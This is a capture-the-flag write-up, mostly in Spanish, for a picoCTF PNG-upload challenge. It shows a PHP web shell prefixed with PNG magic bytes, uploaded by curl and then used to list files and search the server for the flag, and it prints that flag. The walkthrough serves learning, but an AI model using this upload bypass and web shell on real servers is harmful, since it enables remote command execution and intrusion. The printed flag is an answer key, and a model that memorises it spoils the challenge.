### Descripción
I found a web app that can help process images: PNG images only!Try it [here](http://atlas.picoctf.net:53986/)!
### Solución
### Solución 1 - 
```
vemos el /robots.txt

User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/

luego vamos a /instructions.txt
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing. de ahi crearemos un archivo corrupto y lo haremos pasar por png aunque sea php y lo subimos

echo -e "\x89PNG\r\n\x1a\n<?php system(\$_GET['cmd']); ?>" > shelll.png.php
giselle_maz-picoctf@webshell:~$ curl -F "file=@shelll.png.php" http://atlas.picoctf.net:64629/
<!DOCTYPE html>
<html>
<head>
    <title>File Upload Page</title>
</head>
<body>
    <h1>Welcome to my PNG processing app</h1>

    File uploaded successfully and is a valid PNG file. We shall process it and get back to you... Hopefully
    <form method="POST" enctype="multipart/form-data">
        <input type="file" name="file" accept=".png">
        <input type="submit" value="Upload File">
    </form>
</body>
</html>

giselle_maz-picoctf@webshell:~$ curl "http://atlas.picoctf.net:64629/uploads/shelll.png.php?cmd=ls"
PNG

exploit.png.php
sheell.php.png
shelll.png.php

buscamos entre los archivos hasta encontrarla curl "http://atlas.picoctf.net:64629/uploads/shelll.png.php?cmd=find%20/%20-name%20'*flag*'%202>/dev/null"
PNG

/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/sys/devices/pnp0/00:04/00:04:0/00:04:0.0/tty/ttyS0/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.3/tty/ttyS3/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.1/tty/ttyS1/flags
/sys/devices/platform/serial8250/serial8250:0/serial8250:0.2/tty/ttyS2/flags
/sys/devices/virtual/net/lo/flags
/sys/devices/virtual/net/eth0/flags
/sys/module/scsi_mod/parameters/default_dev_flags
/usr/bin/dpkg-buildflags
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/mman-map-flags-generic.h
/usr/include/x86_64-linux-gnu/bits/ss_flags.h
/usr/include/x86_64-linux-gnu/bits/termios-c_cflag.h
/usr/include/x86_64-linux-gnu/bits/termios-c_iflag.h
/usr/include/x86_64-linux-gnu/bits/termios-c_lflag.h
/usr/include/x86_64-linux-gnu/bits/termios-c_oflag.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/linux/tty_flags.h
/usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/ss_flags.ph
/usr/lib/x86_64-linux-gnu/perl/5.32.1/bits/waitflags.ph
/usr/local/lib/php/build/ax_check_compile_flag.m4
/usr/share/dpkg/buildflags.mk
giselle_maz-picoctf@webshell:~$ curl "http://atlas.picoctf.net:64629/uploads/shelll.png.php?cmd=grep%20-r%20'picoCTF'%20/var/www"
PNG

/var/www/html/GAZWIMLEGU2DQ.txt:/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548} */
```
### Notas adicionales 
picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548}
### Referencias
